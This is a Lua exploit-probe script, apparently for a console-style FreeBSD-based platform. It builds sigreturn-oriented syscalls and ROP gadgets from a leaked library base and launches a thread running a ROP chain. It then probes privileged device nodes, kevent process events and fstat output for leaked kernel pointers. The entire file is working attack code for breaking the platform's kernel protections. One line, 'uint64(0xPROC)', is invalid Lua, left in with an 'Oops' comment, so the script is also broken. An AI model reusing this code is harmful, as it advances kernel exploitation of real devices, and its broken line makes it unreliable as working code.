-- CRASH_CLASS: LOW
-- PROBE 142x: Non-blocking device reads + dedicated EVFILT_PROC
-- Fix notification0 blocking by using O_NONBLOCK.
-- Separate kqueue for EVFILT_PROC to avoid event collision.

print("=== PROBE 142x: NONBLOCK + PROC ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_kevent = make_syscall(363)
local sc_kqueue = make_syscall(362)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local brh, brl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", brh, brl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local einfo = memory.alloc(0x200)
wd(einfo, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(einfo)) end)
local elo = safe_rd(einfo + 0x108) or 0
local ehi = safe_rd(einfo + 0x10C) or 0
local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))

local function make_path(base, path)
    for ci = 0, #path - 1 do
        local off = ci
        local addr = base + off - (off % 4)
        local cur = safe_rd(addr) or 0
        local shift = (off % 4) * 8
        cur = cur - (math.floor(cur / 2^shift) % 256) * 2^shift
            + string.byte(path, ci + 1) * 2^shift
        wd(addr, cur)
    end
    local toff = #path
    local taddr = base + toff - (toff % 4)
    local tcur = safe_rd(taddr) or 0
    local tshift = (toff % 4) * 8
    tcur = tcur - (math.floor(tcur / 2^tshift) % 256) * 2^tshift
    wd(taddr, tcur)
end

local O_NONBLOCK = 4
local O_RDWR = 2
local O_RDONLY = 0

--------------------------------------------------------------------
-- [A] Non-blocking reads from devices
--------------------------------------------------------------------
print("")
print("--- [A] Non-blocking device reads ---")

local devs_to_try = {
    {"/dev/notification0", O_RDWR + O_NONBLOCK},
    {"/dev/notification1", O_RDWR + O_NONBLOCK},
    {"/dev/deci_stdout", O_RDONLY + O_NONBLOCK},
    {"/dev/deci_stdin", O_RDONLY + O_NONBLOCK},
    {"/dev/sbl_srv", O_RDONLY + O_NONBLOCK},
    {"/dev/hid", O_RDWR + O_NONBLOCK},
    {"/dev/bt", O_RDWR + O_NONBLOCK},
    {"/dev/dce", O_RDWR + O_NONBLOCK},
    {"/dev/gc", O_RDWR + O_NONBLOCK},
    {"/dev/rng", O_RDONLY + O_NONBLOCK},
    {"/dev/dipsw", O_RDONLY + O_NONBLOCK},
    {"/dev/acm", O_RDWR + O_NONBLOCK},
    {"/dev/gic", O_RDWR + O_NONBLOCK},
    {"/dev/duid", O_RDONLY + O_NONBLOCK},
    {"/dev/sce_zlib", O_RDWR + O_NONBLOCK},
    {"/dev/dbggc", O_RDWR + O_NONBLOCK},
    {"/dev/encdec", O_RDWR + O_NONBLOCK},
    {"/dev/lvd7", O_RDWR + O_NONBLOCK},
    {"/dev/hmd_cmd", O_RDWR + O_NONBLOCK},
}

local path_buf = gpu + 0x1000
local rbuf = gpu + 0x2000

for _, dev in ipairs(devs_to_try) do
    local path, flags = dev[1], dev[2]
    make_path(path_buf, path)
    local rv = srop(5, ua(path_buf), uint64(flags))
    local rh, rl = get_hi_lo(rv)
    if rl < 256 and rh == 0 then
        local fd = rl
        -- Read 256 bytes
        for off = 0, 0xFF, 4 do wd(rbuf + off, 0) end
        local rv_r = srop(3, uint64(fd), ua(rbuf), uint64(256))
        local rrh, rrl = get_hi_lo(rv_r)

        local msg = path .. " fd=" .. fd .. " read=" .. rrl
        if rrl > 0 and rrl < 0x10000 then
            msg = msg .. " DATA!"
            print("[A] " .. msg)
            -- Dump data
            for off = 0, math.min(rrl - 1, 63), 4 do
                local v = safe_rd(rbuf + off) or 0
                if v ~= 0 then
                    print("[A]  +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
                end
            end
            -- Check for kernel pointers
            for off = 0, math.min(rrl - 1, 63), 8 do
                local q = safe_rq(rbuf + off)
                if q then
                    local qh, ql = get_hi_lo(q)
                    if qh >= 0xFFFF8000 then
                        print("[A] *** KERNEL PTR at " .. path .. "+" .. string.format("%02X", off) .. "! ***")
                    end
                end
            end
        else
            print("[A] " .. msg)
        end

        srop(6, uint64(fd))
    end
end

--------------------------------------------------------------------
-- [B] Dedicated EVFILT_PROC kqueue
--------------------------------------------------------------------
print("")
print("--- [B] EVFILT_PROC dedicated ---")

local _, kq2 = pcall(function() return sc_kqueue() end)
local kq2h, kq2l = get_hi_lo(kq2)
print("[B] kqueue=" .. kq2l)

if kq2l < 256 and kq2h == 0 then
    -- Register EVFILT_PROC with NOTE_EXIT + NOTE_FORK + NOTE_EXEC + NOTE_TRACK
    local kev = gpu + 0x3000
    wq(kev + 0x00, uint64(pid))
    wd(kev + 0x08, 0x0001FFFB)  -- EVFILT_PROC=-5, EV_ADD=1
    -- NOTE_EXIT=0x80000000, NOTE_FORK=0x40000000, NOTE_EXEC=0x20000000, NOTE_TRACK=0x00000001
    wd(kev + 0x0C, 0xE0000001)
    wq(kev + 0x10, uint64(0))
    wq(kev + 0x18, uint64(0xPROC))

    -- Oops, fix that marker
    wq(kev + 0x18, uint64(0xAAAA5555))

    local ts0 = gpu + 0x3100
    wq(ts0, uint64(0))
    wq(ts0 + 8, uint64(0))

    -- Register (no eventlist)
    local _, rv_reg = pcall(function()
        return sc_kevent(uint64(kq2l), uint64(kev), uint64(1),
                         uint64(0), uint64(0), uint64(ts0))
    end)
    local regh, regl = get_hi_lo(rv_reg)
    print("[B] register ret=" .. regl)

    -- Spawn thread that exits immediately
    local rop_quick = gpu + 0x10000
    local qi = 0
    wq(rop_quick + qi, g_pop_rdi); qi=qi+8
    wq(rop_quick + qi, uint64(0)); qi=qi+8
    wq(rop_quick + qi, g_pop_rax); qi=qi+8
    wq(rop_quick + qi, uint64(431)); qi=qi+8  -- thr_exit
    wq(rop_quick + qi, sc_addr); qi=qi+8

    local tctx = gpu + 0x20000
    for off = 0, 0x4FF, 4 do wd(tctx + off, 0) end
    pcall(function() return sc_gc(uint64(tctx)) end)
    wq(tctx + 0xE0, g_ret)
    wq(tctx + 0xF8, ua(rop_quick))

    local tid_p = gpu + 0x30000
    wq(tid_p, uint64(0))
    pcall(function()
        return sc_thr_create(uint64(tctx), uint64(tid_p), uint64(0))
    end)
    local t = safe_rq(tid_p)
    local th, tl = get_hi_lo(t)
    print("[B] thread=" .. tl)

    -- Wait 100ms
    local ts100 = memory.alloc(16)
    wq(ts100, uint64(0))
    wq(ts100 + 8, uint64(100000000))
    pcall(function() sc_nanosleep(uint64(ts100), uint64(0)) end)

    -- Poll for events (get up to 4)
    local kev_out = gpu + 0x4000
    for off = 0, 0x7F, 4 do wd(kev_out + off, 0xEE) end

    local _, rv_poll = pcall(function()
        return sc_kevent(uint64(kq2l), uint64(0), uint64(0),
                         uint64(kev_out), uint64(4), uint64(ts0))
    end)
    local ph, pl = get_hi_lo(rv_poll)
    print("[B] poll ret=" .. pl)

    for ev = 0, math.min(pl - 1, 3) do
        local base = kev_out + ev * 0x20
        local ident = safe_rq(base)
        local ff = safe_rd(base + 0x08)
        local ffl = safe_rd(base + 0x0C)
        local data = safe_rq(base + 0x10)
        local udata = safe_rq(base + 0x18)
        local filter = (ff or 0) % 65536
        local flags = math.floor((ff or 0) / 65536) % 65536

        print("[B] ev" .. ev .. " ident=" .. hex(ident) .. " filter=" .. filter ..
              " flags=0x" .. string.format("%04X", flags))
        print("[B] ev" .. ev .. " fflags=0x" .. string.format("%08X", ffl or 0) ..
              " data=" .. hex(data) .. " udata=" .. hex(udata))

        if data then
            local dh, dl = get_hi_lo(data)
            if dh >= 0xFFFF8000 then
                print("[B] *** KERNEL PTR in ev" .. ev .. " data! ***")
            end
        end
    end

    srop(6, uint64(kq2l))
end

--------------------------------------------------------------------
-- [C] kevent on /dev/dce (GPU display device)
--------------------------------------------------------------------
print("")
print("--- [C] kevent on dce ---")

local dce_path = gpu + 0x5000
make_path(dce_path, "/dev/dce")
local rv_dce = srop(5, ua(dce_path), uint64(O_RDWR + O_NONBLOCK))
local dceh, dcel = get_hi_lo(rv_dce)
print("[C] dce fd=" .. dcel)

if dcel < 256 and dceh == 0 then
    local _, kq3 = pcall(function() return sc_kqueue() end)
    local kq3h, kq3l = get_hi_lo(kq3)

    if kq3l < 256 and kq3h == 0 then
        -- Register EVFILT_READ on dce
        local kev_dce = gpu + 0x6000
        wq(kev_dce + 0x00, uint64(dcel))
        wd(kev_dce + 0x08, 0x0001FFFF)  -- EVFILT_READ, EV_ADD
        wd(kev_dce + 0x0C, 0)
        wq(kev_dce + 0x10, uint64(0))
        wq(kev_dce + 0x18, uint64(0xDCE0))

        local kev_dce_r = gpu + 0x6100
        for off = 0, 0x1F, 4 do wd(kev_dce_r + off, 0xEE) end

        local ts_zero = gpu + 0x6200
        wq(ts_zero, uint64(0))
        wq(ts_zero + 8, uint64(0))

        local _, rv_dce_k = pcall(function()
            return sc_kevent(uint64(kq3l), uint64(kev_dce), uint64(1),
                             uint64(kev_dce_r), uint64(1), uint64(ts_zero))
        end)
        local dkh, dkl = get_hi_lo(rv_dce_k)
        print("[C] kevent(dce) ret=" .. dkl)

        if dkl > 0 then
            local ident = safe_rq(kev_dce_r)
            local ff = safe_rd(kev_dce_r + 0x08)
            local data = safe_rq(kev_dce_r + 0x10)
            print("[C] ident=" .. hex(ident) .. " ff=0x" .. string.format("%08X", ff or 0) ..
                  " data=" .. hex(data))
            if data then
                local dh, dl = get_hi_lo(data)
                if dh >= 0xFFFF8000 then
                    print("[C] *** KERNEL PTR! ***")
                end
            end
        end

        srop(6, uint64(kq3l))
    end
    srop(6, uint64(dcel))
end

--------------------------------------------------------------------
-- [D] fstat all open fds for kernel leaks
--------------------------------------------------------------------
print("")
print("--- [D] fstat scan ---")

local statbuf = gpu + 0x7000
for fd = 3, 45 do
    for off = 0, 0x8F, 4 do wd(statbuf + off, 0) end
    local rv_fs = srop(189, uint64(fd), ua(statbuf))
    local fsh, fsl = get_hi_lo(rv_fs)
    if fsl == 0 and fsh == 0 then
        -- Scan stat struct for kernel pointers
        for off = 0, 0x88, 8 do
            local q = safe_rq(statbuf + off)
            if q then
                local qh, ql = get_hi_lo(q)
                if qh >= 0xFFFF8000 then
                    print("[D] *** KERNEL PTR fd=" .. fd .. " stat+" .. string.format("%02X", off) .. "=" .. hex(q) .. " ***")
                end
            end
        end
        -- Print dev/ino/mode for identification
        local dev = safe_rq(statbuf)
        local ino = safe_rq(statbuf + 8)
        local mode = safe_rd(statbuf + 0x10) or 0
        local uid = safe_rd(statbuf + 0x14) or 0
        local size = safe_rq(statbuf + 0x48)
        if mode ~= 0 then
            print("[D] fd=" .. fd .. " mode=0" .. string.format("%o", mode) ..
                  " uid=" .. uid .. " size=" .. hex(size))
        end
    end
end

print("")
print("=== DONE ===")
